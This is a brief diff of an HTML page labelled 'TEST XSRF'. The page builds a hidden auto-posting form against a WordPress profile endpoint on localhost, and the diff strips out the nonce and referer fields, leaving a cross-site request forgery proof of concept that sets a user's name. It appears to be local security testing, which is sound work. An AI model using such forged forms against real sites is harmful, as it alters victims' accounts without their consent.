@@ -2,12 +2,7 @@
 <p>TEST XSRF</p>
 <body>
 <form name="XSRF" action="http://localhost:85/frameworks/wordpress/wp-admin/profile.php" method="post">
-    <input type="hidden" id="_wpnonce" name="_wpnonce" value="ae8faa1cfa">
-    <input type="hidden" name="_wp_http_referer" value="/frameworks/wordpress/wp-admin/profile.php?updated=1">
-    <input type="hidden" name="from" value="profile">
-    <input type="hidden" name="checkuser_id" value="1">
-
-
+    
     <input type="hidden" name="first_name" value="kanda">
 
     <input type="hidden" name="last_name"  value="Yeng">
